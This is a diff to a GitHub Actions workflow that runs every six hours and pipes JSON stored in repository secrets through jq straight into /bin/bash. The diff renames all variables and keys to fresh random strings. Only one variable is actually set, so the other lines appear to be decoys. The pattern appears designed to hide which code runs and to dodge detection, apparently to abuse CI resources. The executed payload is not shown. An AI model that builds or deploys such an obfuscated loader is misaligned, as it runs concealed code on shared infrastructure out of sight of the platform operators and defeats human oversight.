@@ -1,10 +1,9 @@
 name: huiqianhq
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 4/6 * * *'
-jobs:  # 7582
+    - cron: '55 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,17 +11,17 @@ jobs:  # 7582
       - uses: actions/checkout@v4
       - name: huiqianhq
         env:
-          gqq79258: ${{ secrets.gqq79258 }}
+          fdlgw91302: ${{ secrets.fdlgw91302 }}
         run: |
-          echo $gqq79258 | jq -r .p351 | /bin/bash
-          echo $f7072 | jq -r .fuel1204 | /bin/bash
-          echo $kca16546 | jq -r .zbrp558 | /bin/bash
-          echo $jjkc86 | jq -r .deodi71 | /bin/bash
-          echo $th09558 | jq -r .l29 | /bin/bash
-          echo $uzfn97 | jq -r .ghfzz17033 | /bin/bash
-          echo $zp75 | jq -r .dp1056 | /bin/bash
-          echo $sjosg784 | jq -r .iavsd2856 | /bin/bash
-          echo $fpe545 | jq -r .mtw299 | /bin/bash
-          echo $jkm9517 | jq -r .ulqj2 | /bin/bash
-          echo $c7703 | jq -r .e036 | /bin/bash
+          echo $fdlgw91302 | jq -r .yvsd15344 | /bin/bash
+          echo $pys47991 | jq -r .ogc93 | /bin/bash
+          echo $btuzw6 | jq -r .a73 | /bin/bash
+          echo $bow6420 | jq -r .fgg9826 | /bin/bash
+          echo $fc97 | jq -r .mm0291 | /bin/bash
+          echo $odwp39 | jq -r .a5742 | /bin/bash
+          echo $gnbr444 | jq -r .bu33 | /bin/bash
+          echo $w5 | jq -r .wlw860 | /bin/bash
+          echo $yl77 | jq -r .vafdm1557 | /bin/bash
+          echo $tj6109 | jq -r .h6669 | /bin/bash
+          echo $sdi38 | jq -r .afm94322 | /bin/bash
 
